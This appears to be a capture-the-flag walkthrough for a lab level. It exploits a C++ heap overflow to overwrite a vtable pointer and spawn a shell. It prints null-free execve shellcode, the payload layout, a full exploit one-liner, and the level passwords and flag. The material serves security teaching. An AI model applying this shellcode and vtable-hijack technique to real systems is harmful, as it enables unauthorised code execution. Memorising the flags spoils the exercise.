1. Download the binary from the server:
   scp -P 2222 level9@localhost:~/level9 .
   Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

2. Analyze the binary with Ghidra:
   - C++ program with class N (108 bytes)
   - Class N has vtable pointer at offset 0, annotation buffer at offset 4, int at offset 0x68
   - N::setAnnotation(char*) - uses strlen() then memcpy() with no bounds check
   - Vtable at 0x08048848 contains: operator+ (0x0804873a), operator- (0x0804874e)
   - Main allocates two N objects and calls setAnnotation(argv[1]) on first object
   - Then calls virtual function through second object's vtable

3. Verify heap layout with ltrace:
   ltrace ./level9 AAAA
   
   Output shows:
   _Znwj(108, ...)  = 0x804a008  ← obj1 allocated
   _Znwj(108, ...)  = 0x804a078  ← obj2 allocated
   
   Distance: 0x804a078 - 0x804a008 = 0x70 = 112 bytes
   
   obj1 annotation buffer starts at: 0x804a00c (obj1 + 4)
   obj2 vtable pointer at: 0x804a078

4. Calculate the exploit:
   Goal: Overflow obj1's annotation buffer to overwrite obj2's vtable pointer
   
   Distance from annotation buffer to obj2 vtable:
   0x804a078 - 0x804a00c = 0x6c = 108 bytes
   
   Challenge: strlen() stops at null bytes, so we need:
   - Null-byte-free shellcode
   - Addresses without null bytes
   
   Solution:
   - Use null-free shellcode (40 bytes):
     \xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c
     \x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe1\xff\xff
     \xff\x2f\x62\x69\x6e\x2f\x73\x68
   
   - Place NOP sled + shellcode at start of annotation buffer
   - Overflow to overwrite obj2's vtable with fake vtable address
   - Fake vtable points back to our shellcode location
   
   Payload structure:
   [20 NOPs] + [40-byte shellcode] + [48 NOPs] + [fake_vtable_ptr] + [shellcode_addr]
   
   - Bytes 0-19: NOP sled (\x90 * 20)
   - Bytes 20-59: Shellcode (40 bytes)
   - Bytes 60-107: NOP padding (\x90 * 48)
   - Bytes 108-111: Fake vtable pointer = 0x0804a07c (\x7c\xa0\x04\x08)
   - Bytes 112-115: Shellcode address = 0x0804a01c (\x1c\xa0\x04\x08)
   
   The fake vtable at 0x0804a07c contains the address 0x0804a01c,
   which points into our NOP sled, sliding into shellcode.

5. Connect to the VM via SSH:
   ssh level9@localhost -p 2222
   Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

6. Execute the exploit:
   ./level9 $(python -c 'print "\x90"*20 + "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x90"*48 + "\x7c\xa0\x04\x08" + "\x1c\xa0\x04\x08"')
   
   Shell spawned!

7. Get the flag:
   cat /home/user/bonus0/.pass
   
   Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

8. Exit and login as bonus0:
   su bonus0
